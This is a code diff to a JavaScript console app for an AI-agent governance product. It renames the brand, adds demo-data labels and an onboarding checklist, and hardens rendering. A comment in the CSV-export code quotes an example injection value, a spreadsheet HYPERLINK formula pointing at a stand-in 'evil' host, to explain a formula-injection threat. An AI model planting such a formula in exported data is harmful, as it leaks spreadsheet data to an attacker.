@@ -1,5 +1,5 @@
 /*
- * AgentVisor AI console. Application.
+ * ProofVisor console. Application.
  *
  * Hash-routed vanilla SPA. All data flows through window.dataSource
  * (mock or api). Views: /login /signup /overview /sessions /sessions/:id
@@ -45,13 +45,13 @@
     lastList: {},
   };
   // Live workspace-context pin for the datasource (see apiFetch's
-  // X-AV-Org stamp): a getter so the value ALWAYS reflects the org this
+  // X-PV-Org stamp): a getter so the value ALWAYS reflects the org this
   // tab is currently rendering — no sync calls to forget at the many
   // state.session assignment sites. Another tab switching workspaces
   // replaces the shared cookie; the server then 409s this tab's stale
   // mutations instead of retargeting them.
   try {
-    Object.defineProperty(window, "__avActiveOrgId", {
+    Object.defineProperty(window, "__pvActiveOrgId", {
       get: function () {
         return state.session && state.session.org ? state.session.org.id : undefined;
       },
@@ -70,7 +70,7 @@
   function applyTheme(t) {
     document.documentElement.setAttribute("data-theme", t);
     state.theme = t;
-    try { localStorage.setItem("av_theme", t); } catch (e) {}
+    try { localStorage.setItem("pv_theme", t); } catch (e) {}
     // The in-app toggle overrides the OS scheme, so the scheme-paired
     // theme-color metas would keep tinting the browser chrome for the
     // wrong theme — collapse them to the explicit choice.
@@ -82,7 +82,7 @@
   }
   function initTheme() {
     var saved;
-    try { saved = localStorage.getItem("av_theme"); } catch (e) {}
+    try { saved = localStorage.getItem("pv_theme"); } catch (e) {}
     if (saved === "light" || saved === "dark") applyTheme(saved);
     else state.theme = matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light";
     // Follow a LIVE OS scheme flip (sunset auto-dark etc.) while the
@@ -93,7 +93,7 @@
     try {
       matchMedia("(prefers-color-scheme: dark)").addEventListener("change", function (ev) {
         var s;
-        try { s = localStorage.getItem("av_theme"); } catch (e2) {}
+        try { s = localStorage.getItem("pv_theme"); } catch (e2) {}
         if (s === "light" || s === "dark") return; // explicit choice wins
         state.theme = ev.matches ? "dark" : "light";
       });
@@ -137,8 +137,8 @@
   // stash `javascript:` in sessionStorage from another tab.
   function consumeReturnTo() {
     try {
-      var t = sessionStorage.getItem("av_return_to");
-      sessionStorage.removeItem("av_return_to");
+      var t = sessionStorage.getItem("pv_return_to");
+      sessionStorage.removeItem("pv_return_to");
       if (typeof t === "string" && t.charAt(0) === "#" && t !== "#/login" && t !== "#/signup") {
         return t;
       }
@@ -160,7 +160,7 @@
     // A 401 from a request that was already in flight when the user
     // re-authenticated must not boot the FRESH session. Any expiry
     // event within 5s of a login is treated as stale.
-    window.addEventListener("av-session-expired", function () {
+    window.addEventListener("pv-session-expired", function () {
       if (!state.session) return; // already logged out; ignore
       if (Date.now() - (state.authedAt || 0) < 5000) return; // stale 401 racing a fresh login
       state.session = null;
@@ -170,17 +170,17 @@
       // machinery the router's login-redirect uses.
       try {
         var full = location.hash || "";
-        if (full && full !== "#/login") sessionStorage.setItem("av_return_to", full);
+        if (full && full !== "#/login") sessionStorage.setItem("pv_return_to", full);
       } catch (e) {}
       toast("Your session expired. Please sign in again");
       navigate("#/login");
     });
     // Cross-tab sign-out: when another tab in this browser signs out,
-    // it writes localStorage.av_signed_out_at. The storage event fires
+    // it writes localStorage.pv_signed_out_at. The storage event fires
     // in *other* tabs (not the writer). We drop our in-memory session
     // and bounce to login without waiting for the next API 401.
     window.addEventListener("storage", function (e) {
-      if (e.key !== "av_signed_out_at" || !e.newValue) return;
+      if (e.key !== "pv_signed_out_at" || !e.newValue) return;
       if (!state.session) return;
       state.session = null;
       stopLiveStream();
@@ -192,7 +192,7 @@
     // the user signed back in elsewhere. Re-check the session and let
     // the tab in.
     window.addEventListener("storage", function (e) {
-      if (e.key !== "av_signed_in_at" || !e.newValue) return;
+      if (e.key !== "pv_signed_in_at" || !e.newValue) return;
       if (state.session) return;
       state.ds.getSession().then(function (s) {
         if (!s || state.session) return;
@@ -208,13 +208,13 @@
     // is enough — a render() here reset live widgets in the OTHER tab
     // (same class as the in-app toggle; see toggleTheme).
     window.addEventListener("storage", function (e) {
-      if (e.key !== "av_theme") return;
+      if (e.key !== "pv_theme") return;
       if (e.newValue !== "light" && e.newValue !== "dark") return;
       if (state.theme === e.newValue) return;
       applyTheme(e.newValue);
     });
     // Cross-tab fresh-workspace lifecycle (mock mode): signup sets
-    // av_mock_fresh_t0, reset/relogin removes it. Identity and fixture
+    // pv_mock_fresh_t0, reset/relogin removes it. Identity and fixture
     // data are derived per page-load, so a second tab that misses the
     // transition keeps the OLD org's name over the NEW org's data —
     // "Acme Robotics" chrome wrapped around Northwind sessions after a
@@ -227,7 +227,7 @@
     // transitions (self-writes are invisible to the storage event).
     syncFreshPresence();
     window.addEventListener("storage", function (e) {
-      if (e.key !== "av_mock_fresh_t0") return;
+      if (e.key !== "pv_mock_fresh_t0") return;
       var now = e.newValue != null;
       if (now === _freshPresence) return;
       _freshPresence = now;
@@ -238,14 +238,14 @@
 
   var _freshPresence = false;
   function syncFreshPresence() {
-    try { _freshPresence = localStorage.getItem("av_mock_fresh_t0") != null; } catch (e) { _freshPresence = false; }
+    try { _freshPresence = localStorage.getItem("pv_mock_fresh_t0") != null; } catch (e) { _freshPresence = false; }
   }
 
   // Written on every successful login/signup so other tabs (parked on
   // the login page after a cross-tab sign-out) can let themselves in.
   function announceSignIn() {
     syncFreshPresence();
-    try { localStorage.setItem("av_signed_in_at", String(Date.now())); } catch (e) {}
+    try { localStorage.setItem("pv_signed_in_at", String(Date.now())); } catch (e) {}
     // Login/passkey/OAuth responses carry {user, org} but not the
     // memberships list or account-level extras like pendingEmail — only
     // GET /me does. Hydrate in the background so multi-org users get
@@ -461,7 +461,7 @@
   function announceRoute(path) {
     var key = path.join("/") || "overview";
     var title = routeTitle(path);
-    document.title = title + " · AgentVisor AI";
+    document.title = title + " · ProofVisor";
     if (key === _lastRouteKey) return; // re-render of the same route
     var first = _lastRouteKey === null;
     _lastRouteKey = key;
@@ -515,7 +515,7 @@
       // shouldn't dump the user on Overview after they authenticate.
       try {
         var full = location.hash || "";
-        if (full && full !== "#/login") sessionStorage.setItem("av_return_to", full);
+        if (full && full !== "#/login") sessionStorage.setItem("pv_return_to", full);
       } catch (e) {}
       return navigate("#/login");
     }
@@ -598,6 +598,7 @@
   // could otherwise make identifiers render REVERSED (Trojan-Source
   // display spoofing) in the audit trail. ZWJ/ZWNJ are deliberately
   // kept so emoji sequences in org/display names still render.
+  function stripBidi(s) { return String(s == null ? "" : s).replace(/[\u061C\u200E\u200F\u202A-\u202E\u2066-\u2069\uFEFF]/g, ""); }
   function esc(s) { return String(s == null ? "" : s).replace(/[\u061C\u200E\u200F\u202A-\u202E\u2066-\u2069\uFEFF]/g, "").replace(/[&<>"']/g, function (c) { return { "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]; }); }
   // Array.from splits by code point, not UTF-16 unit — .slice(0,1) on
   // an emoji-leading name ("🚀 Rocket Corp") rendered a broken "�".
@@ -677,6 +678,20 @@
   }
   // Click-to-copy affordance for credential-ish values (fingerprints,
   // pubkeys, tokens). One delegated handler serves every instance.
+  // Rows staged by "Simulate an attack" carry isDemo (server column /
+  // mock flag). The label keeps staged data visually distinct from real
+  // agent evidence everywhere a row renders.
+  function demoPill() {
+    return ' <span class="pill accent demo-pill" title="Staged by Simulate an attack — signed with the public demo key, not real agent evidence. Remove demo data from the Overview.">demo</span>';
+  }
+  // What a daemon last applied from GET /api/v1/ingest/policies.
+  function bundlePill(d) {
+    if (d.isDemo) return '<span class="pill neutral" title="The demo deployment never runs a daemon.">n/a</span>';
+    var b = d.policyBundle;
+    if (!b) return '<span class="pill neutral" title="This daemon has not pulled the policy bundle yet. Its deployment page shows the config line and command that turn pulling on.">not pulling</span>';
+    if (b.stale) return '<span class="pill warn" title="Applied bundle ' + esc(String(b.etag).slice(0, 12)) + '… is older than the current one — the daemon picks the new bundle up on its next pull.">older bundle</span>';
+    return '<span class="pill ok" title="Applied the current bundle (' + esc(String(b.etag).slice(0, 12)) + '…) ' + esc(timeAgo(b.appliedAt)) + '">current</span>';
+  }
   function copyable(value) {
     if (!value) return "—";
     return '<span class="copyable">' + esc(value) +
@@ -763,7 +778,7 @@
     return '<div class="story-banner" role="note">' +
       '<span class="sb-icon" aria-hidden="true">🛡</span>' +
       '<p><b>What happened here:</b> the <b>' + esc(s.agent) + '</b> agent tried to send <b>' + esc(value) + "</b> to " + reason + ". " +
-      "AgentVisor blocked the payment before any money moved" + (blk ? " (event #" + esc(blk.seq) + ")" : "") +
+      "ProofVisor blocked the payment before any money moved" + (blk ? " (event #" + esc(blk.seq) + ")" : "") +
       (recovered ? ", the agent recovered safely," : "") +
       " and the whole session is sealed under the signed receipt on this page.</p>" +
       (blk ? '<button class="btn" id="jumpToBlock">Jump to the block ↓</button>' : "") +
@@ -930,7 +945,7 @@
           // notices via a storage event and drops its own session state
           // without waiting for the next API 401. The value is a
           // timestamp so re-signing-out later fires the event again.
-          try { localStorage.setItem("av_signed_out_at", String(Date.now())); } catch (e) {}
+          try { localStorage.setItem("pv_signed_out_at", String(Date.now())); } catch (e) {}
           navigate("#/login");
         }).catch(function () {
           // Logout only succeeds after the shared session fence is
@@ -991,7 +1006,7 @@
         '<header class="topbar" role="banner">' +
           '<a class="brand" href="#/overview">' +
             '<img class="brand-mark" src="../logo.png" alt="" width="22" height="22" />' +
-            '<span>AgentVisor AI</span>' +
+            '<span>ProofVisor</span>' +
           "</a>" +
           statusChip +
           '<div class="spacer"></div>' +
@@ -1341,7 +1356,7 @@
       '<div class="auth-shell">' +
         '<section class="auth-form">' +
           '<div class="auth-form-inner">' +
-            '<div class="auth-brand"><img class="auth-brand-mark" src="../logo.png" alt="" width="26" height="26" /> AgentVisor AI</div>' +
+            '<div class="auth-brand"><img class="auth-brand-mark" src="../logo.png" alt="" width="26" height="26" /> ProofVisor</div>' +
             '<h1>' + (isSignup ? "Create your workspace" : "Sign in") + '</h1>' +
             '<p class="sub">' + (isSignup ? "Governance for every AI agent in your fleet." : "Access your agent control plane.") + '</p>' +
             noteHtml +
@@ -1397,7 +1412,7 @@
                   toast("No SSO configured for that domain. Ask your admin to add your IdP in Settings → SSO.", true);
                   return;
                 }
-                var relay = (sessionStorage.getItem("av_return_to") || "");
+                var relay = (sessionStorage.getItem("pv_return_to") || "");
                 var url = r.ssoConfig.loginUrl + (relay ? "?RelayState=" + encodeURIComponent(relay) : "");
                 window.location.assign(url);
               }).catch(function (err) {
@@ -1477,7 +1492,7 @@
           // A brand-new workspace has none of the data behind whatever
           // deep link bounced the user to auth — drop the saved
           // return-to and land on onboarding instead of a stale 404.
-          try { sessionStorage.removeItem("av_return_to"); } catch (e2) {}
+          try { sessionStorage.removeItem("pv_return_to"); } catch (e2) {}
           navigate("#/overview");
         } else {
           navigate(consumeReturnTo() || "#/overview");
@@ -1544,7 +1559,7 @@
       '<div class="auth-shell">' +
         '<section class="auth-form">' +
           '<div class="auth-form-inner">' +
-            '<div class="auth-brand"><img class="auth-brand-mark" src="../logo.png" alt="" width="26" height="26" /> AgentVisor AI</div>' +
+            '<div class="auth-brand"><img class="auth-brand-mark" src="../logo.png" alt="" width="26" height="26" /> ProofVisor</div>' +
             '<h1>Join the workspace</h1>' +
             '<p class="sub">' + (email ? 'Accept your invite for <b>' + esc(email) + '</b> and set a password.' : 'Accept your invite and set a password.') + '</p>' +
             '<form id="acceptForm">' +
@@ -1611,7 +1626,7 @@
       '<div class="auth-shell">' +
         '<section class="auth-form">' +
           '<div class="auth-form-inner">' +
-            '<div class="auth-brand"><img class="auth-brand-mark" src="../logo.png" alt="" width="26" height="26" /> AgentVisor AI</div>' +
+            '<div class="auth-brand"><img class="auth-brand-mark" src="../logo.png" alt="" width="26" height="26" /> ProofVisor</div>' +
             '<h1>Confirm your new email</h1>' +
             '<div id="ceStatus"><p class="sub">Verifying the link…</p></div>' +
             '<div class="auth-alt"><a href="#/login">← Back to sign in</a></div>' +
@@ -1635,7 +1650,7 @@
         // state match on purpose instead of via a surprise 401.
         stopLiveStream();
         state.session = null;
-        try { localStorage.setItem("av_signed_out_at", String(Date.now())); } catch (e) {}
+        try { localStorage.setItem("pv_signed_out_at", String(Date.now())); } catch (e) {}
       }
       status.innerHTML =
         '<div class="mock-badge" style="margin-top:0; text-align:left; padding: 10px 12px;">' +
@@ -1674,7 +1689,7 @@
       '<div class="auth-shell">' +
         '<section class="auth-form">' +
           '<div class="auth-form-inner">' +
-            '<div class="auth-brand"><img class="auth-brand-mark" src="../logo.png" alt="" width="26" height="26" /> AgentVisor AI</div>' +
+            '<div class="auth-brand"><img class="auth-brand-mark" src="../logo.png" alt="" width="26" height="26" /> ProofVisor</div>' +
             (stage === "request"
               ? '<h1>Reset your password</h1>' +
                 '<p class="sub">We\'ll email you a link to pick a new one.</p>' +
@@ -1766,12 +1781,18 @@
     var mySeq = ++_overviewFetchSeq;
     var rangeLabel = { "1h": "the last hour", "24h": "the last 24 hours", "7d": "the last 7 days", "30d": "the last 30 days" }[state.range] || "the last 24 hours";
     if (!quiet) main.innerHTML = pageHeader("Overview", "Fleet activity for " + rangeLabel + ".", rangeGroup()) + loadingBlock("stats");
-    var stats, sessions;
+    var stats, sessions, demoInfo = null, ob = null;
     try {
       stats = await state.ds.getOverview(state.range);
       var res = await state.ds.listSessions();
       if (mySeq !== _overviewFetchSeq) return; // superseded by a newer range/render
       sessions = res.sessions.slice(0, 8);
+      // Demo footprint + the live-mode onboarding checklist read real
+      // state (policies, members, invites); both are cheap and skipped
+      // once the checklist is complete or dismissed.
+      if (typeof state.ds.getDemoStatus === "function") demoInfo = await state.ds.getDemoStatus().catch(function () { return null; });
+      ob = await liveOnboardingState(stats, res.sessions);
+      if (mySeq !== _overviewFetchSeq) return;
     } catch (e) {
       if (mySeq !== _overviewFetchSeq) return;
       // A quiet (stream-driven) refresh must never replace a live
@@ -1795,7 +1816,8 @@
 
     main.innerHTML =
       pageHeader("Overview", "Fleet activity for " + rangeLabel + ".", attackBtn() + rangeGroup()) +
-      onboardingCard(stats, sessions) +
+      onboardingCard(stats, sessions, ob) +
+      demoNotice(demoInfo) +
       '<div class="stats">' +
         stat("Sessions", stats.sessions, stats.deployments + " deployment" + (stats.deployments === 1 ? "" : "s"), sparkline(series.map(function (b) { return b.allowed + b.blocked; }))) +
         stat("Tool calls allowed", stats.toolsAllowed.toLocaleString(), "policy pass", sparkline(allowedByHour)) +
@@ -1846,6 +1868,7 @@
     installChartHover(main, series);
     var sim = main.querySelector("#simAttack");
     if (sim) sim.addEventListener("click", runAttackDemo);
+    on("#removeDemo", "click", function () { openRemoveDemoModal(function () { render(); }); });
     // Fresh-workspace onboarding: the checklist ticks itself live as
     // the daemon connects and the first sessions stream in, so keep
     // re-rendering (quietly — no skeleton swap) while it's on screen.
@@ -1865,9 +1888,63 @@
    * first block. Invisible outside fresh mode. */
   var overviewTimer = null;
   function freshT0() {
-    try { var v = localStorage.getItem("av_mock_fresh_t0"); return v ? +v : null; } catch (e) { return null; }
+    try { var v = localStorage.getItem("pv_mock_fresh_t0"); return v ? +v : null; } catch (e) { return null; }
   }
-  function onboardingCard(stats, sessions) {
+  // Live mode: the checklist derives from real workspace state — a
+  // deployment, a received session, a policy, a second member or a
+  // pending invite. It disappears once everything is done and can be
+  // dismissed at any time (per workspace). Returns null when nothing
+  // should render, so onboardingCard() falls back to the mock's
+  // fresh-workspace card.
+  function obStorageKey() {
+    var org = state.session && state.session.org && state.session.org.id;
+    return "pv_ob_dismissed_" + (org || "live");
+  }
+  async function liveOnboardingState(stats, sessions) {
+    if (!state.ds || state.ds.mode !== "api") return null;
+    try { if (localStorage.getItem(obStorageKey()) === "1") return null; } catch (e) {}
+    var realDeps = Math.max(0, (stats.deployments || 0) - (stats.demoDeployments || 0));
+    var realSessions = (sessions || []).some(function (x) { return !x.isDemo; }) || ((stats.sessions || 0) - (stats.demoSessions || 0)) > 0;
+    var out = { hasDep: realDeps > 0, hasSession: realSessions, hasPolicy: false, hasTeam: false };
+    var role = (state.session && state.session.org && state.session.org.role) || "member";
+    var calls = [
+      state.ds.listPolicies().then(function (p) { out.hasPolicy = (p || []).length > 0; }, function () {}),
+      state.ds.listMembers().then(function (m) { if ((m || []).length > 1) out.hasTeam = true; }, function () {}),
+    ];
+    // Invites are owner/admin-only on the API; members see the step
+    // from the member count alone.
+    if (role !== "member" && typeof state.ds.listInvites === "function") {
+      calls.push(state.ds.listInvites().then(function (r) { var inv = (r && r.invites) || r || []; if (inv.length) out.hasTeam = true; }, function () {}));
+    }
+    await Promise.all(calls);
+    if (out.hasDep && out.hasSession && out.hasPolicy && out.hasTeam) return null; // all done — the card goes away
+    return out;
+  }
+  function onboardingCard(stats, sessions, live) {
+    if (live) {
+      var lsteps = [
+        { done: true, label: "Create your workspace", sub: "Done — you're in" },
+        { done: live.hasDep, label: "Register a deployment", sub: live.hasDep ? "A daemon is registered" : "Create one to get an ingest token for pvctl console-sync", href: "#/deployments" },
+        { done: live.hasSession, label: "Receive your first session", sub: live.hasSession ? "Sessions are streaming in" : "Run pvctl console-sync --watch on the host that runs your agent — or press ⚡ Simulate an attack to stage one", href: "#/sessions" },
+        { done: live.hasPolicy, label: "Write a policy", sub: live.hasPolicy ? "Daemons pull your policies as one bundle" : "Start from a template; daemons pull it with --pull-policies", href: "#/policies" },
+        { done: live.hasTeam, label: "Invite a teammate", sub: live.hasTeam ? "Your team is here" : "Add a second member or send an invite", href: "#/settings/members" },
+      ];
+      var ldone = lsteps.filter(function (x) { return x.done; }).length;
+      var lrows = lsteps.map(function (x, i) {
+        var inner = '<span class="ob-tick' + (x.done ? " done" : "") + '">' + (x.done ? "✓" : i + 1) + "</span>" +
+          '<span class="ob-body"><span class="ob-label">' + esc(x.label) + "</span>" +
+          '<span class="ob-sub">' + esc(x.sub) + "</span></span>";
+        return x.href && !x.done
+          ? '<a class="ob-step" href="' + esc(x.href) + '">' + inner + "</a>"
+          : '<div class="ob-step' + (x.done ? " done" : "") + '">' + inner + "</div>";
+      }).join("");
+      return '<div class="onboard-card card" role="region" aria-label="Getting started" data-live="1">' +
+        '<div class="ob-head"><h2>Getting started</h2><span class="ob-count">' + ldone + " of " + lsteps.length + "</span>" +
+        '<button type="button" class="btn" id="obDismiss" title="Hide this checklist" aria-label="Dismiss the getting-started checklist" style="margin-left:auto;padding:2px 10px">Dismiss</button>' +
+        '<div class="ob-bar"><span style="width:' + (ldone / lsteps.length) * 100 + '%"></span></div></div>' +
+        '<div class="ob-steps">' + lrows + "</div>" +
+      "</div>";
+    }
     if (freshT0() == null) return "";
     var hasDep = stats.deployments > 0;
     var hasSess = stats.sessions > 0;
@@ -1884,7 +1961,7 @@
     // the top of the dashboard forever is noise once the story's told.
     // (Storage write is guarded; a quota failure just means the card
     // returns next visit.)
-    try { if (doneCount === steps.length && localStorage.getItem("av_ob_dismissed") === "1") return ""; } catch (e) {}
+    try { if (doneCount === steps.length && localStorage.getItem("pv_ob_dismissed") === "1") return ""; } catch (e) {}
     var rows = steps.map(function (s, i) {
       var inner =
         '<span class="ob-tick' + (s.done ? " done" : "") + '">' + (s.done ? "✓" : i + 1) + "</span>" +
@@ -1915,8 +1992,25 @@
    * default 2.6 s was shorter than the read time of these lines, so
    * each step vanished before a viewer finished it. */
   var attackRunning = false;
+  // Demo footprint banner (live mode: isDemo rows exist; mock: staged
+  // attack sessions) with the one-click cleanup.
+  function demoNotice(info) {
+    if (!info || !info.present) return "";
+    var role = (state.session && state.session.org && state.session.org.role) || "member";
+    var n = info.sessions || 0;
+    return '<div class="notice demo-notice" role="status" style="margin-bottom:12px"><span class="pill accent">demo</span>' +
+      '<span style="flex:1">' + esc(n + " staged session" + (n === 1 ? "" : "s") + (info.deployments ? " under the demo-attack deployment" : "") + " — signed with the public demo key, labeled demo in every table, and counted in the figures above.") + "</span>" +
+      (role !== "member" ? '<button type="button" class="btn" id="removeDemo">Remove demo data</button>' : "") +
+      "</div>";
+  }
   function attackReady() {
-    if (state.ds.mode !== "mock" || typeof state.ds.simulateAttack !== "function") return false;
+    if (typeof state.ds.simulateAttack !== "function") return false;
+    if (state.ds.mode === "api") {
+      // The server stages the story (POST /api/v1/demo/attack) and
+      // refuses members; hide the button for them instead of 403-ing.
+      var role = (state.session && state.session.org && state.session.org.role) || "member";
+      return role !== "member";
+    }
     // Fresh workspace: only once the daemon is connected and signing —
     // a staged session can't exist while the deployments page still
     // says "run the install command" (and not after the daemon was
@@ -1926,7 +2020,7 @@
   function attackBtn() {
     if (!attackReady()) return "";
     return '<button class="btn" id="simAttack"' + (attackRunning ? " disabled" : "") +
-      ' title="Stage a live blocked payment in this demo org">⚡ Simulate an attack</button> ';
+      ' title="' + (state.ds.mode === "api" ? "Stage a blocked payment under a demo-attack deployment (labeled demo; removable)" : "Stage a live blocked payment in this demo org") + '">⚡ Simulate an attack</button> ';
   }
   async function runAttackDemo() {
     if (attackRunning || !attackReady()) return;
@@ -1969,9 +2063,9 @@
           rerender(info.id);
           setTimeout(function () {
             var st = document.querySelector(".stat.savings");
-            if (st) st.classList.add("av-pulse");
+            if (st) st.classList.add("pv-pulse");
             var row = document.querySelector('tr[data-id="' + info.id + '"]');
-            if (row) row.classList.add("av-new-row");
+            if (row) row.classList.add("pv-new-row");
           }, 700);
           toastLink("Blocked before the money moved — $" + info.valueUsd.toLocaleString() + " kept. Receipt signed.", "#/sessions/" + info.id, "View session →");
           resolve();
@@ -2032,16 +2126,21 @@
       // "Allowed 0 / Blocked 0". The pointer arrow is a CSS
       // pseudo-element on .chart-tip (see styles.css) so no
       // extra markup lands here.
-      var total = s.allowed + s.blocked;
-      var blockPct = total > 0 ? Math.round((s.blocked / total) * 100) : 0;
+      // Counts arrive from the API; coerce so a non-numeric value can
+      // never reach innerHTML as markup (it renders as 0 instead).
+      var allowed = Number(s.allowed) || 0;
+      var blocked = Number(s.blocked) || 0;
+      var spendUsd = Number(s.spendUsd) || 0;
+      var total = allowed + blocked;
+      var blockPct = total > 0 ? Math.round((blocked / total) * 100) : 0;
       var rateBadge = total > 0
         ? '<span class="tip-rate' + (blockPct > 0 ? ' danger' : '') + '">' + blockPct + '% blocked</span>'
         : '<span class="tip-rate quiet">quiet</span>';
       tip.innerHTML =
         '<div class="tip-label">' + esc(s.label || "") + rateBadge + "</div>" +
-        '<div class="tip-row"><span class="d" style="background: var(--accent)"></span>Allowed <b>' + s.allowed.toLocaleString() + "</b></div>" +
-        '<div class="tip-row"><span class="d" style="background: var(--danger-solid)"></span>Blocked <b>' + s.blocked.toLocaleString() + "</b></div>" +
-        (s.spendUsd > 0 ? '<div class="tip-row muted">Spend $' + s.spendUsd.toFixed(2) + "</div>" : "");
+        '<div class="tip-row"><span class="d" style="background: var(--accent)"></span>Allowed <b>' + allowed.toLocaleString() + "</b></div>" +
+        '<div class="tip-row"><span class="d" style="background: var(--danger-solid)"></span>Blocked <b>' + blocked.toLocaleString() + "</b></div>" +
+        (spendUsd > 0 ? '<div class="tip-row muted">Spend $' + spendUsd.toFixed(2) + "</div>" : "");
     }
     function hideTip() { tip.style.display = "none"; cursor.style.opacity = "0"; clearBarHover(); }
     chart.addEventListener("mousemove", function (e) {
@@ -2186,7 +2285,7 @@
       // re-renders the existing bar stays live (repainting it killed
       // its listeners mid-debounce and dropped keystrokes) — the fetch
       // happens first and only a winning response repaints.
-      main.innerHTML = pageHeader("Sessions", "Every agent session policed by AgentVisor.") + filterBar() + loadingBlock("table");
+      main.innerHTML = pageHeader("Sessions", "Every agent session policed by ProofVisor.") + filterBar() + loadingBlock("table");
     }
     var deps;
     try {
@@ -2302,7 +2401,7 @@
     // one char short — missing \r. R77 F1's threat description
     // names CR explicitly: "Excel / Google Sheets / Numbers
     // interpret any cell whose first char is =, +, -, @, TAB
-    // or CR as a formula." A leaked-AV_INGEST_TOKEN attacker
+    // or CR as a formula." A leaked-PV_CONSOLE_TOKEN attacker
     // (R119 F2 / R124 F3 / R125 F3 threat model) that sets
     // sessionExternalId = "\r=HYPERLINK(\"http://evil/\"&A2,\"Sign here\")"
     // lands a CR-leading formula into an owner's Excel-opened
@@ -2325,7 +2424,7 @@
     var blob = new Blob(["\ufeff" + lines.join("\r\n")], { type: "text/csv;charset=utf-8" });
     var a = document.createElement("a");
     a.href = URL.createObjectURL(blob);
-    a.download = "agentvisor-sessions-" + stamp + ".csv";
+    a.download = "proofvisor-sessions-" + stamp + ".csv";
     document.body.appendChild(a);
     a.click();
     a.remove();
@@ -2356,7 +2455,8 @@
     if (fD && deps) {
       deps.forEach(function (d) {
         var o = document.createElement("option");
-        o.value = d.id; o.textContent = d.name;
+        // Same bidi-control stripping esc() applies to markup.
+        o.value = d.id; o.textContent = stripBidi(d.name);
         if (sessionsFilter.deploymentId === d.id) o.selected = true;
         fD.appendChild(o);
       });
@@ -2392,8 +2492,8 @@
   // quiet overview refreshes, so per-render wiring would drop off).
   document.addEventListener("click", function (e) {
     if (!e.target || e.target.id !== "obDismiss") return;
-    try { localStorage.setItem("av_ob_dismissed", "1"); } catch (e2) {}
     var card = e.target.closest(".onboard-card");
+    try { localStorage.setItem(card && card.getAttribute("data-live") ? obStorageKey() : "pv_ob_dismissed", "1"); } catch (e2) {}
     if (card) card.remove();
   });
 
@@ -2420,10 +2520,10 @@
         ? '<span class="pill err">' + s.toolsBlocked + " blocked</span>"
         : (s.status === "quarantined_crash_evidence" ? '<span class="pill warn">unknown · partial</span>' : '<span class="pill ok">clean</span>');
       return '<tr data-clickable data-id="' + esc(s.id) + '" data-nav="#/sessions/" tabindex="0">' +
-        '<td title="' + esc(s.agent + " · " + s.externalId) + '"><div style="font-weight:500">' + esc(s.agent) + '</div><div class="id">' + esc(s.externalId) + "</div></td>" +
-        '<td title="' + esc(s.user || "") + '"><div class="actor"><span class="av">' + esc(initials(s.user)) + '</span>' + esc(s.user || "—") + '</div></td>' +
-        '<td class="num tabular">' + s.events + "</td>" +
-        '<td class="num tabular">' + s.toolsAllowed + "</td>" +
+        '<td title="' + esc(s.agent + " · " + s.externalId) + '"><div style="font-weight:500">' + esc(s.agent) + (s.isDemo ? demoPill() : "") + '</div><div class="id">' + esc(s.externalId) + "</div></td>" +
+        '<td title="' + esc(s.user || "") + '"><div class="actor"><span class="pv">' + esc(initials(s.user)) + '</span>' + esc(s.user || "—") + '</div></td>' +
+        '<td class="num tabular">' + esc(s.events) + "</td>" +
+        '<td class="num tabular">' + esc(s.toolsAllowed) + "</td>" +
         "<td>" + blocks + "</td>" +
         '<td class="num tabular">' + usdMicros(s.costUsdMicros) + "</td>" +
         '<td style="color: var(--fg-2)">' + timeAgoCell(s.startedAt) + "</td>" +
@@ -2540,11 +2640,24 @@
     // when each event actually happened relative to the session's timeline,
     // and derive a parent-child depth so LLM → tool-call chains indent.
     var totalDur = events.reduce(function (a, e) { return a + (e.durationMs || 0); }, 0) || 1;
+    // Live events carry a timestamp but no measured duration (the
+    // ingest payload has none). Place those bars by when the event
+    // happened relative to the first and last event instead of
+    // pretending every bar is a one-percent-wide duration.
+    var haveDurations = events.some(function (e) { return e.durationMs > 0; });
+    var firstTs = events.length ? new Date(events[0].ts).getTime() : NaN;
+    var lastTs = events.length ? new Date(events[events.length - 1].ts).getTime() : NaN;
+    var tsSpan = isFinite(firstTs) && isFinite(lastTs) && lastTs > firstTs ? lastTs - firstTs : 0;
     var offset = 0;
     var parentLlm = -1;
     var eventsWithLayout = events.map(function (e, i) {
       var startPct = (offset / totalDur) * 100;
       var widthPct = Math.max(1, ((e.durationMs || 0) / totalDur) * 100);
+      if (!haveDurations && tsSpan > 0) {
+        var at = new Date(e.ts).getTime();
+        startPct = isFinite(at) ? Math.min(99, ((at - firstTs) / tsSpan) * 100) : 0;
+        widthPct = 1;
+      }
       var depth = 0;
       if (e.kind === "llm") { parentLlm = i; depth = 0; }
       else if (e.kind === "tool" || e.kind === "guard" || e.kind === "block") {
@@ -2629,7 +2742,7 @@
     var unsealed = !!(receipt && receipt.note);
     var rcptDis = unsealed ? ' disabled title="' + (quarantined ? "No receipt is available for incomplete crash evidence" : "Available when the session seals — the daemon signs the receipt at seal") + '"' : "";
     main.innerHTML =
-      pageHeader("Session " + s.externalId, s.agent + " · " + (s.user || "—") + " · " + (s.model || ""), '<a href="' + esc(backToListUrl("sessions")) + '" class="btn">← All sessions</a> ' + nav + '<button class="btn" id="printPack" title="Print this page as a clean evidence pack — receipt and event trail included">🖨 Print evidence pack</button> <button class="btn" id="copyRcpt"' + rcptDis + '>Copy receipt</button> <button class="btn" id="shareRcpt"' + rcptDis + '>🔗 Share verify link</button> <button class="btn accent" id="dlRcpt"' + rcptDis + '>↓ Download receipt</button>') +
+      pageHeader("Session " + s.externalId, s.agent + " · " + (s.user || "—") + " · " + (s.model || "") + (s.isDemo ? " · demo data staged by Simulate an attack" : ""), '<a href="' + esc(backToListUrl("sessions")) + '" class="btn">← All sessions</a> ' + nav + '<button class="btn" id="printPack" title="Print this page as a clean evidence pack — receipt and event trail included">🖨 Print evidence pack</button> <button class="btn" id="copyRcpt"' + rcptDis + '>Copy receipt</button> <button class="btn" id="shareRcpt"' + rcptDis + '>🔗 Share verify link</button> <button class="btn accent" id="dlRcpt"' + rcptDis + '>↓ Download receipt</button>') +
       (quarantined ? '<div class="notice" role="status"><div><strong>Quarantined crash evidence.</strong> This session contains incomplete evidence recovered after a daemon crash. All counts and totals are partial. No signed receipt is available.</div></div>' : "") +
       '<div class="session-summary">' +
         cell("Events", s.events, "streamed") +
@@ -2670,7 +2783,7 @@
         " · printed " + esc(new Date().toLocaleString()) +
         (receipt && receipt.receiptId ? " · receipt " + esc(receipt.receiptId) : "") +
         (receipt && receipt.signingKeyFingerprint ? " · signing key " + esc(receipt.signingKeyFingerprint) : "") +
